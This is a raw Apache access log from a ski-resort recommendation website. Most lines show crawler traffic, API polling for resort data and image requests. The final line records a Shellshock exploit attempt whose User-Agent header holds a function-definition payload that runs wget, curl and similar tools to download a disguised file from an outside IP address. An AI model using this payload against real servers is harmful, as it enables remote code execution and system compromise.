170.75.162.130 - - [18/Jan/2016:16:20:52 -0800] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 994 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:16:20:52 -0800] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 1085 "-" "node-superagent/1.4.0"
73.225.157.231 - - [18/Jan/2016:16:34:10 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
180.76.15.160 - - [18/Jan/2016:16:35:05 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.135 - - [18/Jan/2016:16:36:06 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.64.8 - - [18/Jan/2016:16:37:19 -0800] "GET /resorts?resort=belleayre&date=2014-02-05 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
108.201.221.249 - - [18/Jan/2016:16:50:43 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
96.38.141.234 - - [18/Jan/2016:17:02:49 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 992 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1037 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1043 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=bigwhite HTTP/1.1" 200 927 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 1045 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 1026 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1040 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 1004 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 977 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 1003 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 973 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:04:24 -0800] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 1060 "-" "node-superagent/1.4.0"
127.0.0.1 - - [18/Jan/2016:17:04:25 -0800] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.2.22 (Ubuntu) (internal dummy connection)"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1010 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1080 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 1025 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1049 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=grandtarghee HTTP/1.1" 200 1061 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=devilshead HTTP/1.1" 200 942 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=mammothmountain HTTP/1.1" 200 1084 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 1047 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1033 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 933 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 1043 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:17 -0800] "GET /lib/reccapi.php?resort=snowbasin HTTP/1.1" 200 1020 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:22 -0800] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 990 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:27 -0800] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:32 -0800] "GET /lib/reccapi.php?resort=steamboat HTTP/1.1" 200 999 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:37 -0800] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 1005 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:42 -0800] "GET /lib/reccapi.php?resort=sunpeaksresort HTTP/1.1" 200 924 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:47 -0800] "GET /lib/reccapi.php?resort=whistlerblackcomb HTTP/1.1" 200 933 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:52 -0800] "GET /lib/reccapi.php?resort=telluride HTTP/1.1" 200 984 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:05:57 -0800] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 1079 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:02 -0800] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1027 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:07 -0800] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 1038 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:12 -0800] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1017 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:17 -0800] "GET /lib/reccapi.php?resort=jacksonhole HTTP/1.1" 200 1068 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:22 -0800] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1042 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:27 -0800] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 1026 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:32 -0800] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 1067 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:37 -0800] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1054 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:42 -0800] "GET /lib/reccapi.php?resort=loveland HTTP/1.1" 200 1021 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:47 -0800] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 1025 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:52 -0800] "GET /lib/reccapi.php?resort=monarch HTTP/1.1" 200 959 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:06:57 -0800] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1014 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:02 -0800] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 1059 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:07 -0800] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1043 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:12 -0800] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 1044 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:17 -0800] "GET /lib/reccapi.php?resort=redmountain HTTP/1.1" 200 910 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:22 -0800] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1039 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:27 -0800] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 1012 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:32 -0800] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 1027 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:37 -0800] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 1047 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:42 -0800] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 1049 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:47 -0800] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 1038 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:52 -0800] "GET /lib/reccapi.php?resort=taos HTTP/1.1" 200 938 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:17:07:57 -0800] "GET /lib/reccapi.php?resort=winterpark HTTP/1.1" 200 994 "-" "node-superagent/1.4.0"
66.249.64.127 - - [18/Jan/2016:17:14:56 -0800] "GET /lib/reccapi.php?resort=missionridge&date=2016-01-19 HTTP/1.1" 200 1114 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:17:14:58 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-19&coords=47.28%2C-120.39&size=7&sort=distance HTTP/1.1" 200 1407 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:17:14:58 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=missionridge&dateStart=2016-01-17 HTTP/1.1" 200 880 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.7 - - [18/Jan/2016:17:18:55 -0800] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
162.231.242.88 - - [18/Jan/2016:17:21:07 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
180.76.15.33 - - [18/Jan/2016:17:31:04 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.64.8 - - [18/Jan/2016:17:31:26 -0800] "GET /lib/reccapi.php?resort=missionridge&date=2016-01-21 HTTP/1.1" 200 1045 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:17:31:27 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=missionridge&dateStart=2016-01-19 HTTP/1.1" 200 711 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:17:31:27 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-21&coords=47.28%2C-120.39&size=7&sort=distance HTTP/1.1" 200 1403 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.11 - - [18/Jan/2016:17:31:54 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
72.167.190.20 - - [18/Jan/2016:17:33:29 -0800] "HEAD / HTTP/1.0" 200 310 "-" "Mozilla/5.0 (compatible; WoTBoT; +http://privatewww.essex.ac.uk/~jcread/WoTBoT.html)"
66.249.64.2 - - [18/Jan/2016:17:38:17 -0800] "GET /lib/reccapi.php?resort=missionridge&date=2016-01-20 HTTP/1.1" 200 1057 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:17:38:18 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-20&coords=47.28%2C-120.39&size=7&sort=distance HTTP/1.1" 200 1417 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:17:38:19 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=missionridge&dateStart=2016-01-18 HTTP/1.1" 200 796 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
199.59.148.210 - - [18/Jan/2016:17:39:07 -0800] "GET /robots.txt HTTP/1.1" 200 363 "-" "Twitterbot/1.0"
199.59.148.210 - - [18/Jan/2016:17:39:07 -0800] "GET / HTTP/1.1" 200 2559 "-" "Twitterbot/1.0"
199.59.148.210 - - [18/Jan/2016:17:39:07 -0800] "GET / HTTP/1.1" 200 2559 "-" "Twitterbot/1.0"
47.208.176.144 - - [18/Jan/2016:17:41:59 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 304 187 "http://thebackcountry.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
95.27.70.161 - - [18/Jan/2016:17:42:34 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6071 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36 OPR/18.0.1284.63 (Edition Yx)"
108.46.59.63 - - [18/Jan/2016:17:44:38 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (X11; CrOS armv7l 7520.67.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.110 Safari/537.36"
67.169.58.219 - - [18/Jan/2016:18:01:23 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
70.214.36.171 - - [18/Jan/2016:18:09:35 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53"
173.252.105.119 - - [18/Jan/2016:18:20:22 -0800] "GET / HTTP/1.1" 200 2615 "-" "-"
173.252.105.113 - - [18/Jan/2016:18:20:23 -0800] "GET / HTTP/1.1" 200 2615 "-" "-"
173.252.105.114 - - [18/Jan/2016:18:20:23 -0800] "GET / HTTP/1.1" 200 2615 "-" "-"
67.164.183.217 - - [18/Jan/2016:18:24:02 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
180.76.15.8 - - [18/Jan/2016:18:25:54 -0800] "GET /about HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
163.172.7.229 - - [18/Jan/2016:18:29:09 -0800] "GET / HTTP/1.1" 200 2615 "-" "Stratagems Kumo"
163.172.7.229 - - [18/Jan/2016:18:29:09 -0800] "GET /robots.txt HTTP/1.1" 200 419 "-" "Stratagems Kumo"
163.172.7.229 - - [18/Jan/2016:18:29:10 -0800] "GET / HTTP/1.1" 200 2614 "-" "Stratagems Kumo"
163.172.7.229 - - [18/Jan/2016:18:29:10 -0800] "GET / HTTP/1.1" 200 2614 "-" "Stratagems Kumo"
163.172.7.229 - - [18/Jan/2016:18:29:10 -0800] "GET /robots.txt HTTP/1.1" 200 419 "-" "Stratagems Kumo"
163.172.7.229 - - [18/Jan/2016:18:29:10 -0800] "GET /robots.txt HTTP/1.1" 200 419 "-" "Stratagems Kumo"
163.172.7.229 - - [18/Jan/2016:18:29:10 -0800] "GET / HTTP/1.1" 200 2614 "-" "Stratagems Kumo"
199.16.156.126 - - [18/Jan/2016:18:29:10 -0800] "GET /robots.txt HTTP/1.1" 200 363 "-" "Twitterbot/1.0"
163.172.7.229 - - [18/Jan/2016:18:29:10 -0800] "GET /robots.txt HTTP/1.1" 200 418 "-" "Stratagems Kumo"
199.16.156.126 - - [18/Jan/2016:18:29:10 -0800] "GET /recommendations HTTP/1.1" 404 450 "-" "Twitterbot/1.0"
163.172.7.229 - - [18/Jan/2016:18:29:10 -0800] "GET / HTTP/1.1" 200 2614 "-" "Stratagems Kumo"
163.172.7.229 - - [18/Jan/2016:18:29:11 -0800] "GET /robots.txt HTTP/1.1" 200 418 "-" "Stratagems Kumo"
180.76.15.140 - - [18/Jan/2016:18:31:02 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.27 - - [18/Jan/2016:18:31:52 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
24.6.216.219 - - [18/Jan/2016:18:33:40 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36"
123.125.71.16 - - [18/Jan/2016:18:36:52 -0800] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
123.125.71.42 - - [18/Jan/2016:18:36:54 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
170.75.162.130 - - [18/Jan/2016:18:39:39 -0800] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 1088 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:18:39:39 -0800] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1133 "-" "node-superagent/1.4.0"
166.137.242.57 - - [18/Jan/2016:18:45:27 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
52.33.40.213 - - [18/Jan/2016:18:47:06 -0800] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 1044 "-" "node-superagent/1.4.0"
98.210.233.33 - - [18/Jan/2016:18:52:00 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
220.181.108.104 - - [18/Jan/2016:18:52:03 -0800] "-" 408 0 "-" "-"
66.249.64.127 - - [18/Jan/2016:18:56:22 -0800] "GET /lib/reccapi.php?resort=whistlerblackcomb&date=2016-01-20 HTTP/1.1" 200 970 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:18:56:24 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-20&coords=50.1159%2C-122.949&size=7&sort=distance HTTP/1.1" 200 1420 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:18:56:24 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=whistlerblackcomb&dateStart=2016-01-18 HTTP/1.1" 200 618 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.24 - - [18/Jan/2016:19:05:00 -0800] "GET /#about HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.159 - - [18/Jan/2016:19:05:27 -0800] "GET /robots.txt HTTP/1.1" 200 375 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.156 - - [18/Jan/2016:19:06:14 -0800] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
170.75.162.130 - - [18/Jan/2016:19:06:23 -0800] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 1032 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:19:06:24 -0800] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:19:06:24 -0800] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 987 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:19:06:24 -0800] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 1075 "-" "node-superagent/1.4.0"
180.76.15.29 - - [18/Jan/2016:19:07:34 -0800] "GET /resorts?resort=laslenas&date=2014-09-29 HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.64.8 - - [18/Jan/2016:19:13:08 -0800] "GET /lib/reccapi.php?fields=t&date=2015-12-21 HTTP/1.1" 200 1951 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
198.202.202.45 - - [18/Jan/2016:19:17:30 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
66.249.64.8 - - [18/Jan/2016:19:19:11 -0800] "GET /lib/reccapi.php?resort=homewoodmountain&date=2016-01-17 HTTP/1.1" 200 1140 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:19:19:12 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-17&coords=39.17%2C-120.22&size=7&sort=distance HTTP/1.1" 200 1408 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:19:19:13 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=homewoodmountain&dateStart=2016-01-15 HTTP/1.1" 200 879 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.2 - - [18/Jan/2016:19:24:37 -0800] "GET /lib/reccapi.php?resort=hoodoo&date=2016-01-17 HTTP/1.1" 200 1079 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:19:24:38 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=hoodoo&dateStart=2016-01-15 HTTP/1.1" 200 882 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:19:24:38 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-17&coords=44.42%2C-121.89&size=7&sort=distance HTTP/1.1" 200 1384 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [18/Jan/2016:19:28:06 -0800] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 987 "-" "node-superagent/1.4.0"
180.76.15.34 - - [18/Jan/2016:19:36:00 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [18/Jan/2016:19:36:47 -0800] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 978 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:19:36:48 -0800] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 1080 "-" "node-superagent/1.4.0"
180.76.15.27 - - [18/Jan/2016:19:37:00 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
76.103.26.163 - - [18/Jan/2016:19:39:04 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
66.249.64.2 - - [18/Jan/2016:19:41:41 -0800] "GET /resorts?resort=mountbaker&date=2014-03-05 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
108.68.104.46 - - [18/Jan/2016:19:46:01 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
189.125.5.246 - - [18/Jan/2016:19:46:17 -0800] "GET HTTP/1.1 HTTP/1.1" 400 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
